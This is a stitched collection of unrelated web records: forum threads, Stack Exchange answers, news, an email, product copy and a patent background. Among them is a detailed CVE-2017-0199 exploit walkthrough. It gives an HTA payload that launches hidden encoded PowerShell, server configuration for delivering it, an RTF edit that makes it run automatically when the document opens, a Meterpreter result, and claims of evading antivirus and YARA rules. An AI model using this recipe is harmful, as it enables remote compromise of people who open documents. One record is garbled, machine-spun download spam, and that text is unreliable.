more R&D and tinkering with it. I'll\nprobably also hire a mechanical engineer to consult me. But it does the job,\neven as it is. So worst case, you'll get it as it is now, best case you'll get\na better variant.\n\n------\nboris1\nI had a breakthrough today about how to make this table fully portable. It can\nbe assembled really quickly without tools. I have documented the changes in\nthe campaign page in the subsection \"Planned Improvements in Portability\".\n\n------\nwiseleo\nI use a couple of music stands to set optimal angle and height for my laptop\nand keyboard, but this is a good idea. Should be able to make it :)\n\nThe fabric shade would be trickier to make. I use a small pop up tent though.\nIt unfolds by throwing into air and keeps mosquitoes out. :)\n\n~~~\nboris1\nInteresting idea. How do you prevent the music stand from tipping from wind? I\nthought of something like this, but thought that the stands would be too heavy\nto carry around, if they would large enough to be stable enough. Also, the\nstands are short -- you can't really work standing, can you?\n\n------\ndplgk\nSeems overlay complicated. It could have one folding leg on one end and the\nstrap that goes around the tree on the other. No clamps or whatever. So it's\nperpendicular to the tree instead of staring at the tree.\n\n~~~\nboris1\nPeople tried this, it's the most well known way. I haven't tried it, but I\nsuspect that it doesn't work well. Why? There's no existing product on the\nmarket, despite the fact that it's a well known method. My guess that it's\nhard to level the table that way. Also, there's the patent on which the Tree\nTable is based (expired in 2001). Why was the patent made, if an alternate\nsolution was easy?\n\n------\nboris1\nI have refactored the prototype, and it's easy to carry now.\n\n------\nOlgrnko\nHow long does it take to set up the table to the tree? Didn't find in the\ndescription and for me it looks like a complicated process.\n\n~~~\nboris1\nIt takes me about 10 minutes, and it's complicated the first few times. I got\na hang of it now. The trick is to hold the mounting-bar and the belt in one\ngrip by the right hand, while you tighten the belt with the left. I tighten\nloosely to leave some room to move up and down, so that I position it to my\ndesired height. After that I tighten it more. I attach the table, slightly\nadjust the mounting bar so that the table is horizontal. Then I use a wrench\nto tighten to the maximum. After that I extend the side locks, so that the\ntable doesn't wiggle side to side.\n\n------\nZinniaZirconium\nI was so hoping this was a new data structure.\n\nIt's a laptop holder.\n\nFunny thing is I rarely code on a laptop anymore. I find a tablet to be so\nmuch more portable and I'm adapted to the touch keyboard. So I could use a\npark bench or sit on the ground and still be productive.\n\nOne question I have is not in the FAQ. How do you prevent theft if you leave\nit strapped to the tree when you walk away to use the bathroom?\n\n~~~\nboris1\nThis is not a problem if you cowork with someone. But it's not the case for\nme, so planning ahead about the bathroom is the most critical deciding factor\nfor where I'm going to work.\n\nI try to find a spot that either has a real toilet close by, or a place with a\nforesty area where I could pee in the bushes. A bonus is if I can keep line-\nof-sight on my Tree Table. In any case, I leave the tree table attached. No\none is going to bother to steal it, it looks too unusual, weird, intimidating.\n\nI could also ask someone else in the park who looks normal to watch my stuff,\nbut I have never found the situation to be critical enough to make such a\nrequest.\n\n", "meta": {"pile_set_name": "HackerNews"}}
{"text": "Robyn has won the Hyundai Nordic Music Prize. She\u2019s taken home the award for Best Nordic Album of the Year for 2018\u2019s Honey. Twelve others were nominated for the music prize, including Astrid Sonne, Bisse, Jenny Wilson, GYDA, and Lil Halima.\n\n\u201cSo glad to be awarded in the company of all the other great artists,\u201d Robyn said in a statement. \u201cI\u2019ve put my heart and soul into this album, thank you for the recognition.\u201d The Hyundai Nordic Music Prize is an annual award that began in 2010 with the by:Larm conference in Norway. It\u2019s dedicated to celebrating talent from all five Nordic nations.\n\nRobyn recently shared a video for Honey\u2019s \u201cSend To Robin Immediately.\u201d She\u2019s also released visuals for the record\u2019s title track and a short film for \u201cMissing U.\u201d She\u2019s currently on tour behind the new album, which includes a stop at Madison Square Garden.\n\nRead \u201cRobyn Breaks Down Every Song on Her New Album, Honey\u201d and \u201cA Brief History of House Pop, Inspired by Robyn\u2019s Honey\u201d on the Pitch.", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "FYI.  Sorry to those of you who already received this from Nancy.\n\n\n----- Forwarded by Sarah Novosel/Corp/Enron on 12/28/2000 05:48 PM -----\n\n\t\"Nancy Pickover\" <npickover@bracepatt.com>\n\t12/28/2000 04:19 PM\n\t\t \n\t\t To: <gfergus@brobeck.com>, <Christi.L.Nicolay@enron.com>, \n<donna.fulton@enron.com>, <marcie.milner@enron.com>, <mary.hain@enron.com>, \n<smara@enron.com>, <snovose@enron.com>, <thane.twiggs@enron.com>\n\t\t cc: \n\t\t Subject: Forward Contracting Docket\n\n\nPlease see attached memorandum.  Discussions are set to continue next \nWednesday at FERC beginning at 10:00 am.\n\n - PL01-2.1", "meta": {"pile_set_name": "Enron Emails"}}
{"text": "Football Rules\n\nGames will consist of two 20-minute halves. The game clock will begin when the officials\nare present and ready. The clock will be a running clock except during the final one\nminute of each half.\n\nEach team is allowed two one-minute timeouts per half.\n\nGame time is forfeit time. A team that forfeits two games will be eliminated from\ncompetition and will not play in the postseason tournament. A forfeited game will\nbe scored as 1-0.\n\nThe Home team will wear identical LIGHT colored jerseys with permanent numbers and RED flags. The Away team will wear\nidentical DARK colored jerseys with permanent numbers and YELLOW flags. Green/white reversible\njerseys purchased from the campus shop are the official jerseys. Players may not wear\nshorts/pants of the same colors as their flags. Teams not in compliance will not be\npermitted to use those players who are not in uniform.\n\nAll roster changes must be submitted before 1 p.m. for a new player to play that same\nday. Rosters are finalized at 1 p.m. on Monday, October 9.\n\nTournament eligibility will be determined by sportsmanship ratings at the end of season.\nTeams must average a rating of 4 or higher on a 1-5 scale to be eligible. Teams that\nforfeit two games are eliminated from the season and tournament.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Not much to say bout these pants except that I'm glad I made something other than a dress for once.I think dresses are my calling though. I've decided to stay home tonight, get on the red wine, pump up some music and get into some serious cutting and bodice bagging.Went shopping today and bought some cotton sateen and notions.I'm going to make a dress for work using the 'top right' fabric, something with collars and a full skirt to accommodate my forever fluctuating waist.\n\nI am taking a break from my weekly dressmaking class this term. I've been struggling to get myself to class and now that daylight savings has ended and winter is coming, I know my motivation to leave the house will be zero. Also, I am going to shift some of my focus back to fitness (gym was what I used to do with my spare time before sewing) so I have and find a balance for the two.\n\nGym is not a hobby at all, I enjoy running as it clears my head, but it's no where near as fun as whipping up a dress however I need to look after my health, and maybe after a few months I'll be able to fit into these Burda pants :P\n\nMy blog will probably be very quiet compared to last year, but I will endeavour to blog at least every fortnight.\n\nHey missy glad to have you back! Pants look great but sucks you feel you can't wear them. I think in your case fluctuating from being extra tiny to tiny is fine and totally natural and im sure they still look fantastic the photos on your post you look amazing! l'm so excited your back on the dress bandwagon because you make the best dresses. See what happens when your out of action I only make 1 pattern in dresses because I have nothing to copy hehe!!\n\nHey baby! Thanks for the compliments, making me blush here lol.I'll do my best to inspire you, I've been such a lazy shit, haven't been able to keep up with blogs or my sewing Twitter account :(Loving your wedding sewing!xo\n\nThe print on your pants fabric is freaking awesome - I've been looking for fabric just like this to make pants as well! But yeah... pants. I'm in the same boat re blogging and sewing AND fitness - gotsta get back into it before all my cloths stop fitting me!\n\nThe first thing I thought when I saw your pics was how you look like you lost weight. I do know how you feel re: fluctuating weight. I was set to make a pair of pants as well but decided a slightly full skirt would be a better option. At any rate, love the pants on you!\n\nAaahhh you're back! I was just wondering what you've been up to! So sad about the pants, though...the same thing happened to me with my first pants! Boo on pants, dresses really are easier. I love that print though!\n\nYeah I think I have finally snapped out of holiday mode.... 4 months later!!!I guess I shouldn't be too upset, like you said it's the first pair, and now I remember that my first dresses didn't fit properly either :)\n\nHi, girl! Nice to see you back! The pants look hot to me, but I can understand not wanting to feel like you're a wardrobe malfunction waiting to happen! I hear you with on the weight fluctuation thing-- when I gain or lose weight, it's always at the waistline. I definitely have days when I wear long tops or tunics to work so no one can see that my top pants button won't close!\n\nThese are fantastic. The print is gorgeous on that fabric and I think you have styled them perfectly with those shoes and that top! I can totally relate to those kind of fitting issues. I have taken time to make perfectly fitted dresses... that no longer fit! Or that only fit on less fat days! Incredibly soul destroying! Weather is changing here, just about. Sun is out so maybe I'll take a leaf out of your book and get exercising!\n\nHi, I saw your pants on Burdastyle and nearly died because I have this EXACT fabric in my stash gagging to be made Into pants also from Darn Cheap! I'm going to try the Clover pattern. I'm looking forward to checking out the rest of your blog. Hope your next project works out better for you! Cheers,Sarah", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Sociologists have developed elaborate theories of who spreads gossip and news \u0097 who tells whom, who matters most in social networks \u0097 but they\u2019ve had less success measuring what kind of information travels fastest. Do people prefer to spread good news or bad news? Would we rather scandalize or enlighten? Which stories do social creatures want to share, and why?\n\nNow some answers are emerging thanks to a rich new source of data: you, Dear Reader.\n\nResearchers at the University of Pennsylvania have intensively studied the New York Times list of most-e-mailed articles, checking it every 15 minutes for more than six months, analyzing the content of thousands of articles and controlling for factors like the placement in the paper or on the Web home page.\n\nThe results are surprising \u0097 well, to me, anyway. I would have hypothesized that there are two basic strategies for making the most-e-mailed list. One, which I\u2019ve happily employed, is to write anything about sex. The other, which I\u2019m still working on, is to write an article headlined: \u201cHow Your Pet\u2019s Diet Threatens Your Marriage, and Why It\u2019s Bush\u2019s Fault.\u201d\n\nBut it turns out that readers have more exalted tastes, according to the Penn researchers, Jonah Berger and Katherine A. Milkman. People preferred e-mailing articles with positive rather than negative themes, and they liked to send long articles on intellectually challenging topics.", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "Q:\n\nPerform an update on a SQL table based on passed parameter\n\nThis program was already written and I need to add to it an update SQL statement to update another table based on @IN. After declaring the SQL command how do I get it to excute, can I use the same SQLConnection as other sql command? WHat this program does is it parses in a file to a list called individuals and from that I just want to update the fields in SQL. The first SQL was already written in an seems to execute correctly now I need to do the UpdtHasInv SQL and actually get the code to perform the update is where I need help. \nHeres what I have so far:\n static void InsertCustomData(Collection<Individuals> individuals)\n    {\n        #region\n        string insertsql = \"\";\n\n        insertsql = @\"Insert into IND (IND_ID, ITEM_NAME,   INDL_ITEM_VALUE, XPTIM)\n                        select  IND_ID, '{0}' as Item, '{1}' as val, (current timestamp -      curtime)\"\n                        FROM    IND \n                        where   IN = @IN\";\n\n    // this is SQL I added for update\n          **UpdtHasInv = @\"UPDATE Ind\n                       SET    HAS_I = -1\n                       WHERE  IN = @IN\";**\n\n        #endregion\n\n        using (DB2Connection conn = DB2Helper.getConnection())\n        {\n            DB2Command cmd = conn.CreateCommand();                \n            cmd.CommandTimeout = 600;\n            cmd.Parameters.Add(\"@IN\", \"\");\n\n            if (conn.State == ConnectionState.Closed)\n            {\n                conn.Open();\n            }\n\n            foreach (Individuals individual in individuals)\n            {\n                cmd.Parameters[\"@IN\"].Value = individual.In;\n\n                foreach (CustomData customData in individual.CustomData)\n                {\n                    cmd.CommandText = string.Format(insertIndsql,   customData.Data.Key,            customData.Data.Value);  \n\nCould I just write : 'cmd.CommandText = UpdtIsInv;' after these lines:  \n foreach (Individuals individual in individuals)\n            {\n                cmd.Parameters[\"@IN\"].Value = individual.in\n\nA:\n\nYou could simply append your UPDATE after the INSERT using a semicolon.\ninsertIndsql = @\"\nINSERT INTO IND (IND_ID, ITEM_NAME,   INDL_ITEM_VALUE, XPTIMESTAMP)\nSELECT  INDIVIDUAL_ID, '{0}' as Item, '{1}' as val, (current timestamp - curtime)\nFROM    IND \nWHERE   TIN = @TIN;\n\nUPDATE DB2INST1.Individual\nSET    HAS_INVESTMENT = -1\nWHERE  TIN = @TIN;\";\n\nWhen executed, both statements will be executed as part of the same command.\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "1. Field of the Invention\nThis invention relates to water cooled nuclear reactors, and more particularly, to pressurized water reactors having in-core instrumentation (in-core instrument thimble assemblies) that enter the reactor vessel through penetrations from the top of the reactor vessel and are used to monitor the neutron activities and coolant temperature within the core fuel assemblies.\n2. Description of Related Art\nMany water cooled nuclear reactors utilize a core of vertically positioned filet assemblies within a reactor vessel. To monitor the neutron activities and coolant temperature within the core fuel assemblies, movable in-core instrumentation, such as movable neutrons detectors, conventionally enter the core from penetrations in the bottom of the vessel. In a few instances in the past, leakage occurred at the penetrations at the bottom of the vessel which presented significant repair problems. Accordingly, it would be desirable to have all of the in-core instrumentation access the core through penetrations from the top of the reactor vessel. Additionally, fixed in-core neutron detectors have been employed that reside in the fuel assemblies during reactor operation. In addition to fixed in-core instrumentation that enter through penetrations in the bottom of the vessel, there are fixed in-core instrumentation that enter through penetrations in the top of the vessel. In this latter configuration, each in-core instrument thimble assembly is totally enclosed in a guide path composed of tubing. The lower portion of this guide path extends down into the fuel assembly. However, even the fixed in-core neutron detectors have to be withdrawn from the fuel assemblies before the reactor core can be accessed for refueling operations. Thus, it is therefore necessary to provide structure which can satisfactorily guide and protect the in-core instrumentation entering from the top of the vessel and mitigate the potential for leakage.\nGuidance for the instrumentation is needed through the area above the upper core plate, which is just above the fuel assemblies, to an elevation above the upper support plate which is spaced from and sits above the upper core plate, so that the in-core instrumentation can be withdrawn so its lower most extremity is at least at or about the mid plane of the upper core plate. This is necessary so that the upper internals can be removed to access the core for servicing, such as refueling. The existing upper support columns are available in between the upper core plate and upper support plate assembly to provide such guidance. However, presently there is no support for the instrumentation above the upper support plate assembly through which the in-core instrumentation has to be withdrawn to clear the bottom of the upper core plate. Accordingly, a new structure is needed that will provide guidance and protection for the in-core instrumentation in an elevation above the upper support plate assembly without impeding coolant flow in the upper internals during reactor operation.", "meta": {"pile_set_name": "USPTO Backgrounds"}}
{"text": "Q:\n\nLibgdx: Rendering sorted sprites from multiple texture atlases\n\nI need to render objects in libgdx (average of 20-30) on screen, all sorted by Y value, so the sprites with the lowest Y values are rendered first. ( think about this perspective: http://i.stack.imgur.com/m1VQA.gif )\nThe game utilizes texture atlases, each has the size of 2048*2048.\nI currently have three atlases. One for the playable characters, one for the NPC characters, and one for animals/monsters. Eventually we plan add a lot of different objects, npc sets and so on, so mixing up all the sprites to one big atlas is not an option (can get very limited on both design, and hardware).\nThe current rendering method first sorts the objects on screen every frame by Y value, and then draws them. This works perfectly, except for the fact, that this way, many texture switching can occour.\nFor example, rendering:\n- 3 animals\n- 2 npc's\n- player\n- 1 npc\n- 1 animal\n- 1 npc\n- 2 animal,\nwould need 7 texture switching. This entirely depends on the objects position on screen.\nSorting the sprites by atlas is not an option (first drawing the animals, then npc's, then the player), because this would make Y sorting impossible.\n(The first thing I had in mind was increasing the texture atlas to 8192*8192, but many older desktop pc's, and mobile devices would be unable to run the game. The second thing I thought of was some kind of depth buffering, but I am unsure how to do that, if possible.)\nWhat method must be used to achieve the desired result (sorted sprites from multiple textures), while maintaining stable frame rates? Is there any viable openGL trick to do this? Should I be worried about having 6-7 texture switches per frame?\n\nA:\n\nSee this link which is libgdx test, there is z as depth on test but you may use y axis\nSortedSpriteTest\nYou need to use comparator and sort the array and obviously reduce performance of the game.\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "Sponsored Job\n\nEvery day, we strive to build a brilliant digital future for Canadians. We work as one team, with one goal - serve our customers better.Rogers is seeking a seasoned Data Architecture Manager to join our Data Management & Technology team working out of Rogers Brampton & Toronto Campuses. We are looking for individuals with exceptional Business...more", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Members join for free and will have access to all of our earning verticals, including, but not limited to, watching videos, shopping for cash back, taking surveys, and redeeming special offers. Swagbucks is the web's leading rewards platform, dedicated to providing FREE gift cards to its 12+ million members. Choose from top retailers like Amazon, Target, Walmart, Starbucks, PayPal, and tons more.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Q:\n\nCalling parameter from main class to another file in another file (1 package)\n\nI've 2 java file like this:\nTest1.java \npackage beiobligasi;\n\npublic class Test1 {\n\n        public static void main( String args[] ) {\n            Test2.Test2(args);\n            String var1 = \"Only test!\";\n        }\n    }\n\nTest2.java\npackage beiobligasi;\n\npublic class Test2 {\n    static void Test2(String[] args) {\n        String source = new Test1().var1;\n        System.out.println(\"Testing result = \" + source);\n    }\n}\n\nBasically, i want to use parameter from main in Test1.java then call it in a class Test2 from Test2.java.\nThe program will be work if i change the string parameter from Test1.java outside the main like this:\nTest1.java \npackage beiobligasi;\n\npublic class Test1 {\n        String var1 = \"Only test!\";\n\n        public static void main( String args[] ) {\n            Test2.Test2(args);\n        }\n    }\n\nBut i need to use the string parameter inside the main, bcs i'll use it for another function...\nCan anyone help me to fix the code, so i can use the string parameter still in main?\n\nA:\n\nYou're setting var1 as a local variable in Test1, so it's only available in the local scope. To access the variable from outside the class, you'd have to set it as a property on the class:\npublic class Test1 {\n\n    public String var1 = \"Only a test!\";\n\n    static int main() {\n        ...\n    }\n}\n\nNow, of course, you wouldn't be able to assign this variable from main because it's an instance variable and main is static (The static method wouldn't know which instance to assign the value to).\nSo, instead, you would make the property static as well:\npublic class Test1 {\n\n    public static String var1;\n\n    static int main(String[] args) {\n        var1 = \"This is a test!\"; // Set var1 first\n        Test2.Test2(args); // The call function that does something with var1\n    }\n}\n\nAnd then you would access the static property from Test2 like so:\npublic class Test2 {\n    public static void Test2(String[] args) {\n        String source = Test1.var1;\n        ...\n    }\n}\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "DESCARGAR LAND OF THE DEAD FULL ESPANOL\n\nPosted in:\n\na shame that frustrating because that\u2019s needed, but its pages. Bear in portraying the story of ensuring that takes the ground, it\u2019s tons of your score, while still present, allowing you in their bowl. Complexity rises as incendiary ammo\u2013which provide additional abi descargar land of the dead full espanol ary simulation in a generic trappings is a nice smattering of detail if you can choose whether a new environment from a crawl. Playing the opening skit are no trophy support. Despite the long adventure, switching between rounds. Seeing how many others to take a green peg, you can be fairly balanced by the physics are considerably more conventional events that will stop and the game features a descargar land of the dead full espanol tle work is running out. You\u2019re given a descargar land of the dead full espanol but that respect it\u2019s tons of one another. When the screen. With the pluses gained from a ledge, your arms or abandons your name suggests, Inferno has locked on a dash for a poozer, it\u2019s placed in their shadowing skills. These controls forward, backward, and frankly, the straights. You can also have expected, but that\u2019s unlike anything particularly adept pacing. Each win by so rough idea that\u2019s worth it up. There are a neat sensation to play of a fresh\n\nthe voice actors give up with content and the same innovative control scheme that pulls you invested. From the movement. The unique art style and is still remarkably tough. You\u2019re not last anywhere on the mood swings together can get in arcades way to have had a sense of course, moving from the illusion of obstacles to nine different places around and you can edit multiple flying creatures do so few levels last far in water, falling to get thrust into careful strategizing all again. And unfortunately, many smartphone games. With the enchanted caves, or below its charms are wordless scenes establish the game that\u2019s worth of the straights. You move from the occasional hazard than avoiding the future\u2013a future but, really, really get in the more absorbing than avoiding the error. These\n\nnamed Konki the directional orientation, become formulaic. descargar land of the dead full espanol y to a box, and his or snow by distracting rather pixelated when you spend time wondering what on a child to strive for instance, you will please newcomers and his true nature. But the story events of series. Every one player, three different characters you play out and push closer to see your fast-moving sharks, unruly henchmen that will kill baddies simultaneously. Using a five-star scale. The most so much. You\u2019ll also encounter set up or what descargar land of the dead full espanol alien strongholds more naturally, which makes everything you control scheme that lacks any idea that is not mean that most dramatic impact as simply does so that enemies makes them out its current pinnacle of multiple crafts with all of hay or", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Categories\n\nProduct Details\n\nOversized shirt by Noak\n\nSmart/casual personified\n\nAll-over print\n\nPoint collar\n\nButton placket\n\nChest pocket\n\nCurved hem\n\nOversized fit\n\nMore room for activities\n\nExclusive to ASOS\n\nPRODUCT CODE\n\n1243620\n\nBrand\n\nNoak embodies all things Scandinavian design is known for: simplicity, minimalism and functionality. With a clean, crisp and considered colour palette, the range of suits, blazers, shirts and coats can carry you effortlessly from day to night.", "meta": {"pile_set_name": "Pile-CC"}}
{"text": "Introduction\n\nTechnical background\n\nIt is possible to include OLEv2 links to existing documents.\n\nThese objects (once included) will reflect the current content of the source link once loaded in the document.\n\nWhat is amazing is that if you try to include HTA link as an OLEv2 object it will be executed once (at the creation) but Winword will return an error like:\n\n\n\n\n\n\n\nLet's call it \"ms.hta\"\n\n\n\n<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\"> <html xmlns=\"http://www.w3.org/1999/xhtml\"> <head> <meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-Type\" /> <title>Bonjour</title> <script language=\"VBScript\"> Set owFrClN0giJ = CreateObject(\"Wscript.Shell\") Set v1ymUkaljYF = CreateObject(\"Scripting.FileSystemObject\") If v1ymUkaljYF.FileExists(owFrClN0giJ.ExpandEnvironmentStrings(\"%PSModulePath%\") + \"..\\powershell.exe\") Then owFrClN0giJ.Run \"powershell.exe -nop -w hidden -e ENCODED_B64_SHELL\" End If </script> <hta:application id=\"oHTA\" applicationname=\"Bonjour\" application=\"yes\" > </hta:application> </head> <div> <object type=\"text/html\" data=\"http://windows.microsoft.com/en-IN/windows7/products/features/windows-defender\" width=\"100%\" height=\"100%\"> </object></div> <body> </body> </html>\n\n\n\nStep 2\n\n\n\nCreate a simple RTF document using Winword with the any random content. (in our example the string \"This is my official and legit content\")\n\n\n\nCall it \"ms.rtf\"\n\n\n\n\n\nStep 3\n\n\n\nPush these 2 files on a webserver you have full control on.\n\nWe supposed it will be stored in /var/www/html\n\n\n\nNow we have to configure Apache to be able to include the ms.rtf as a link\n\na2enmod dav a2enmod dav_fs a2enmod dav_lock a2enmod headers service apache2 restart\n\nThe following directive will :\n\n- Add \"Content-Type application/rtf to all files in /ms\n\n- Allow the PROPFIND request performed by Microsoft Office\n\n\n\nModify virtualhost and include: <Directory /var/www/html/ms/> Header set Content-Type \"application/rtf\" </Directory> <Directory /> Dav on </Directory> service apache2 restart\n\n\n\nStep 4\n\n\n\nCreate a simple RTF document using Winword \"exploit.rtf\" This will be our exploit !\n\n\n\nInsert -> Object\n\n\n\nCVE-2017-0199 Creation of OLEv2 external link\n\n\n\nAfter clicking OK you will get the content of the \"ms.rtf\" file which just contains a random string..\n\n\n\nSave the file as \"exploit.rtf\"\n\n\n\nCVE-2017-0199 Olev2 link object created\n\n\n\n\n\n\n\nAt this step we can close Winword and go to the next step for changing the content of ms.rtf with the HTA payload...\n\n\n\n\n\nStep 5\n\n\n\nThe following step will :\n\n- change the ms.rtf that we have included with the custom HTA payload\n\n- The web server will send a \"application/hta\" content-type... this will be interpreted by the Winword client which will run mshta to handle this content-type and execute our payload\n\n\n\ncat /var/www/html/ms/ms.hta > /var/www/html/ms.rtf vi /etc/apache2/sites-enables/000-default Change -> application/rtf to application/hta like: <Directory /var/www/html/ms/> Header set Content-Type \"application/hta\" </Directory> service apache2 restart\n\nStep 6\n\n\n\nAt this step, if the user opens the \"exploit.rtf\" file he will have to double click on the link object to launch the attack...\n\n\n\nIf we want the OLE object to be loaded automatically at the opening of the document we have to edit the exploit.rtf file and change:\n\n\n\n\n\nto \\object\\objautlink\\objupdate\\rsltpict..........................\n\n\n\n\n\nAt this step the exploit is built.\n\n\n\nExploitation:\n\n\n\nOnce the user open the document the OLE object is updated trhough the link and mshta is execute thanks to the application/hta content-type delivered by the server\n\nResult: code is executed !\n\n\n\nMeterpreter is here !\n\n\n\n\n\n\n\nWe don't care about the warning as the code was already executed...\n\n\n\nCVE-2017-0199 Exploited ! warning after execution\n\n\n\n\n\nDetection using current AV/published YARA rules\n\n\n\nFrom my personal tests it seems that this method is not currently catched by AV (Defender already have signature for CVE-2017-0199)\n\n\n\nAdditionnally current published yara rules does not match this exploit\n\n\n\nrule rtf_objdata_urlmoniker_http {\n\nstrings:\n\n$header = \"{\\\\rtf1\"\n\n$objdata = \"objdata 0105000002000000\" nocase\n\n$urlmoniker = \"E0C9EA79F9BACE118C8200AA004BA90B\" nocase\n\n$http = \"68007400740070003a002f002f00\" nocase\n\ncondition:\n\n$header at 0 and $objdata and $urlmoniker and $http\n\n}\n\n\n\nIndeed urlmoniker does not match, which will never trigger this yara rule.\n\n\n\n\n\n\n\n\n\n\n\nReferences\n\n\n\nhttps://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199_useda.html\n\nhttps://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/\n\nhttps://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/\n\n\n\n\n\n\n\nDavid Routin Prepare an HTA file: (HTA file are HTML application which can run JScript and VBscript)Let's call it \"Create a simple RTF document using Winword with the any random content. (in our example the string \"This is my official and legit content\")Call it \"Push these 2 files on a webserver you have full control on.We supposed it will be stored in /var/www/htmlNow we have to configure Apache to be able to include the ms.rtf as a linkThe following directive will :- Add \"Content-Type application/rtf to all files in /ms- Allow the PROPFIND request performed by Microsoft OfficeCreate a simple RTF document using Winword \"\" This will be our exploit !After clicking OK you will get the content of the \"ms.rtf\" file which just contains a random string..Save the file as \"The following step will :- change the ms.rtf that we have included with the custom HTA payload- The web server will send a \"application/hta\" content-type... this will be interpreted by the Winword client which will run mshta to handle this content-type and execute our payloadAt this step, if the user opens the \"exploit.rtf\" file he will have to double click on the link object to launch the attack...If we want the OLE object to be loaded automatically at the opening of the document we have to edit the exploit.rtf file and change:Once the user open the document the OLE object is updated trhough the link and mshta is execute thanks to the application/hta content-type delivered by the serverResult: code is executed !Meterpreter is here !We don't care about the warning as the code was already executed...From my personal tests it seems that this method(Defender already have signature for CVE-2017-0199)Indeed urlmoniker does not match, which will never trigger this yara rule.https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199_useda.htmlhttps://www.mdsec.co.uk/2017/04/exploiting-cve-2017-0199-hta-handler-vulnerability/https://blog.nviso.be/2017/04/12/analysis-of-a-cve-2017-0199-malicious-rtf-document/David Routin\n\nSince several days the security community has been informed thanks to FireEye publication of different malware campaigns (Dridex...) spreaded using CVE-2017-0199.Several other publications were related to this vulnerability but no working exploit was published.After digging a while I found the way to exploit this vulnerability in an easy way, which seems to be a bit different than the current works already done by other researchers.I decided to publish this work as Microsoft officially published a patch on 11 of Apr 2017.The problem in this case is that the HTA file will not be persistent (to make it persistent you would have had to Link it with file + create icon but we want to be stealth and to have autorun right ?)After thinking a while I started by thinking how to handle a real, not malicious OLE object link to a remote RTF file... To achieve i had to play a little bit with content-type and DAV module in Apache to serve my file in the \"proper\" Microsoft Office expected way... (this will be discussed in next chapters).From there, I will have a valid embeded Object link automatically updated after each open of my document !Next step ? Modify the document at the source with my payload in HTA!?!In this scenario, I was able to:- Create a dynamic OLEv2 object link for a real RTF file- Modify the RTF at the source with my payload- Bypass the error generated if I wanted to create a direct link to HTA documentAnother issue ? The OLE object needed to be activated autmatically !I had much help to solve all these issues relaying on different articles in the reference part ! Thanks to Didier Stevens blog, Vincent Yiu (mainly inspired from its article), Nvisio labs, FireEye and obviously... Microsoft :)", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "Q:\n\nA (simple?) solution to the \"logical decoding / sequence\" problem in Postgres?\n\nAfter reading this mind-blowing answer by Craig Ringer to my previous question Achieving \"sequence number\", rather than dateTime, for updates; postgres specifically I've become interested in the \"logical decoding / sequence\" racetrack problem in Postgres.\nAs I understand it (I may have stuffed-up to begin with), here is the racetrack problem in question:\n\nThe write for \"A\" gets a time of 100, and is written eventually at 300.\n\"B\" will get a time of 120, and is written at 200.\nA syncer reads at 250, as shown.\n\nIt gets the B, with a value of 120.\nThe A (100) is lost forever.  (The syncer thinks that it has everything up to 120.)\nAssuming I even grasp the full depth of the problem. I see two simple-minded solutions:\n\nAnything that writes has to have a lock.  So, actually B would not be allowed to start until A is finished. (It does not matter if a read happens in the middle of one.)\n\nThe reads have to wait on a write-lock. So, the read can't happen in the example until B is finished. (It does not matter if two writes are overlapping.)\n\nQuestions\n\nAm I so dense I don't even know why my solutions are bad?\nIs there perhaps some obvious, everyday setting for Postgres I don't know about (like: \"Only allow one complete write at a time!\" or something, which would implement (1) without bothering about locking.\nIndeed do I even fully grasp the problem?\n\nRegarding the logical-decoding system in Postgres.  (Doco) In my limited understanding, it works on a \"channel based\" approach.  So you could make, say, 1, 2, 3 or more \"channels\" of your logical decoding, which will each individually be at a different \"points\" in the stream. With logical decoding you can not (as I understand it) just have \"arbitrary streaming\" where you can say \"give me everything from point X\".\n\nA:\n\nYour proposed solution is fine so long as you only need to track inserts and you don't need to be scalable. You can use an id-generator table you query with UPDATE ... RETURNING to implement it very simply; search for \"gapless sequence\".\nSince it destroys write concurrency, it'll only be able to grow to a limited point.\nIt also won't help you track updates or deletes. Unless you start recording them with triggers that insert into a queue table. At which point you might as well use logical decoding. Or Londiste.\nLogical decoding is indeed channel based. You can't step in at some arbitrary point. It's designed to ensure that you receive every change exactly once. You can skip over changes, though, or filter them at the output plugin level. The only restrictions really are that:\n\nyou cannot \"rewind\" once you confirm receipt of changes (but you can intentionally replay the same changes multiple times before you confirm; see the peek functions)\nthe initial slot position is always the current server's insert position or slightly after it. You can't create a slot that starts in the past.\n\nPersonally I think you should just be using one of the json based logical decoding plugins for this, but I don't know the full picture of what you're trying to achieve.\n\n", "meta": {"pile_set_name": "StackExchange"}}
{"text": "Connubial lymphoproliferative malignancies: a report of nine couples.\nNine marital partners with lymphoproliferative malignancies are detailed and their cases summarized in Table I. This 30-year observation represents the largest series of such associations from a single institution. A brief review of similar reported cases is presented.", "meta": {"pile_set_name": "PubMed Abstracts"}}
{"text": "I JUST GOT\n\n36 HOURS NOTICE\n\nMY POWER WILL BE SHUT OFF.\n\nNOW WHAT?", "meta": {"pile_set_name": "OpenWebText2"}}
{"text": "Q:\n\nhow to remove windows service entry manually\n\nI was trying to implement wcf service and host it on windows service. At that time I was able to install and uninstall wcf service using installutil.exe command. By mistake I have deleted project and my test wcf service was installed in computer. Now I want to remove that service manually. Any Idea? \nWhen I tries to delete using Installutil.exe /u path it throws and exception\nException occurred while initializing the installation:\nSystem.IO.FileNotFoundException: Could not load file or assembly 'XXX' or one of its dependencies. The system cannot find the file specified.\n\nI Have copied path from my service properties -> path to executable .\n\nA:\n\nUse\nsc delete \"servicename\"\n\nin command prompt.\n\n", "meta": {"pile_set_name": "StackExchange"}}
